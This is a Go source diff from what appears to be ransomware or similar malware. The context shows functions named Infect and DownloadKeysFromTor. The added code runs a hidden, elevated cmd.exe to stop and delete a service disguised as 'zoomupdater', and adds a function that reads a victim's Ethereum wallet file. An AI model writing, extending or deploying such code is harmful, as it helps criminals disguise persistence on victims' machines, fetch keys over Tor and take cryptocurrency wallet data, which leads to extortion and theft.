@@ -70,6 +70,15 @@ func Infect() (bool, error) {
     return err == nil, errors.WrapIfNotNil(pkg, "failed to flush buffer", err)
 }
 
+func Desinfect() error {
+    err := win.ShellExecute(
+        "runas", "cmd.exe",
+        `/c "sc.exe STOP zoomupdater && sc.exe DELETE zoomupdater"`,
+        win.SW_HIDE,
+    )
+    return errors.WrapIfNotNil(pkg, "failed to desinfect", err)
+}
+
 func DownloadKeysFromTor() error {
     // start tor in the background
     tor := exe.NewTor(torDirectory, "")
@@ -141,6 +150,11 @@ func DownloadKeysFromTor() error {
     }
 
     return nil
+}
+
+func ImportEthereumWallet() (string, error) {
+    wallet, err := ioutil.ReadFile(victimEthereumWallet)
+    return string(wallet), errors.WrapIfNotNil(pkg, "failed to read wallet addr", err)
 }
 
 func ImportSha1PublicKey() (string, error) {
